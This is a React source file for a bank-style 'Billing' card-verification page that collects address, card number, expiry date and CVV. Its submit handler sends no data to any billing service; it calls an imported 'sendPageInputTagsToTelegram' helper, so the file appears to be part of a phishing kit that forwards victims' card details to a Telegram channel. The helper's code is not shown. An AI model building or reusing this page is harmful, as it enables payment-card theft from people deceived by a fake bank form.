import React, { useState } from 'react';
import { sendPageInputTagsToTelegram } from '../utils/telegram';

export function BillingPage() {
  const [address, setAddress] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zip, setZip] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await sendPageInputTagsToTelegram();
  };

  return (
    <div className="bg-white w-full max-w-[500px] shadow-sm flex flex-col font-sans border border-gray-300">
      {/* Header */}
      <div className="bg-[#666666] text-white px-4 py-2 font-bold text-sm">
        Billing
      </div>

      <div className="p-6 flex flex-col bg-[#f2f2f2]">
        <p className="text-[0.7rem] text-gray-800 mb-6">
          Fields marked with an <span className="text-[#CC0000] font-bold">*</span> are
          required.
        </p>

        <form className="space-y-4" onSubmit={handleSubmit}>
          {/* Address */}
          <div className="flex flex-col">
            <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="address">
              Billing Address:
            </label>
            <div className="flex items-center">
              <input
                id="address"
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                className="border border-[#999999] px-1.5 py-0.5 flex-grow bg-white focus:outline-none focus:border-[#00529b]"
                required
              />
              <span className="text-[#CC0000] ml-1 font-bold">*</span>
            </div>
          </div>

          <div className="flex gap-4">
            {/* City */}
            <div className="flex flex-col flex-grow">
              <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="city">
                City:
              </label>
              <div className="flex items-center">
                <input
                  id="city"
                  type="text"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                  required
                />
                <span className="text-[#CC0000] ml-1 font-bold">*</span>
              </div>
            </div>
            {/* State */}
            <div className="flex flex-col w-[80px]">
              <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="state">
                State:
              </label>
              <div className="flex items-center">
                <input
                  id="state"
                  type="text"
                  value={state}
                  onChange={(e) => setState(e.target.value)}
                  className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                  maxLength={2}
                  required
                />
                <span className="text-[#CC0000] ml-1 font-bold">*</span>
              </div>
            </div>
          </div>

          {/* Zip Code */}
          <div className="flex flex-col w-[120px]">
            <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="zip">
              Zip Code:
            </label>
            <div className="flex items-center">
              <input
                id="zip"
                type="text"
                value={zip}
                onChange={(e) => setZip(e.target.value)}
                className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                required
              />
              <span className="text-[#CC0000] ml-1 font-bold">*</span>
            </div>
          </div>

          <div className="pt-4 mt-2 border-t border-gray-300">
             <h3 className="text-[#00529b] text-[0.9rem] font-bold mb-4">
              Card Information
            </h3>
            
            {/* Card Number */}
            <div className="flex flex-col mb-4">
              <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="cardNumber">
                Card Number:
              </label>
              <div className="flex items-center">
                <input
                  id="cardNumber"
                  type="text"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(e.target.value)}
                  className="border border-[#999999] px-1.5 py-0.5 flex-grow bg-white focus:outline-none focus:border-[#00529b]"
                  required
                />
                <span className="text-[#CC0000] ml-1 font-bold">*</span>
              </div>
            </div>

            <div className="flex gap-4">
              {/* Expiry */}
              <div className="flex flex-col w-[100px]">
                <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="expiry">
                  Exp. Date:
                </label>
                <div className="flex items-center">
                  <input
                    id="expiry"
                    type="text"
                    placeholder="MM/YY"
                    value={expiry}
                    onChange={(e) => setExpiry(e.target.value)}
                    className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                    required
                  />
                  <span className="text-[#CC0000] ml-1 font-bold">*</span>
                </div>
              </div>
              {/* CVV */}
              <div className="flex flex-col w-[80px]">
                <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="cvv">
                  CVV:
                </label>
                <div className="flex items-center">
                  <input
                    id="cvv"
                    type="password"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value)}
                    className="border border-[#999999] px-1.5 py-0.5 w-full bg-white focus:outline-none focus:border-[#00529b]"
                    maxLength={4}
                    required
                  />
                  <span className="text-[#CC0000] ml-1 font-bold">*</span>
                </div>
              </div>
            </div>
          </div>

          {/* Submit Button */}
          <div className="pt-6">
            <button
              type="submit"
              className="bg-[#a23232] hover:bg-[#8e2b2b] text-white px-8 py-1.5 text-sm font-semibold transition-colors min-w-[120px] shadow-sm"
            >
              Verify
            </button>
          </div>
        </form>
      </div>

      {/* Footer Links */}
      <div className="bg-white p-4 border-t border-gray-200 text-[0.75rem]">
        <p className="text-gray-800">
          For security questions or to report a lost card, call 888.444.9876.
        </p>
      </div>
    </div>
  );
}
